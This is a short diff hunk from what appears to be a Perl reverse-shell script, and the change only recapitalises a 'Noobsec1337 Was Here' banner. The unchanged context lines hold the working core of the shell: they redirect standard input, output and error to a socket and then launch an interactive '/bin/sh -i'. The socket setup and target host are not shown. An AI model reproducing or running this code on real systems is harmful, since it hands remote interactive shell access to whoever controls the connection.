@@ -10,6 +10,6 @@ open(STDIN, ">&SOCKET");
 open(STDOUT,">&SOCKET");
 open(STDERR,">&SOCKET");
 print "########################################\n";
-print "#       Noobsec1337 Was Here           #\n";
+print "#       noobSec1337 Was Here           #\n";
 print "########################################\n";
 system("/bin/sh -i");
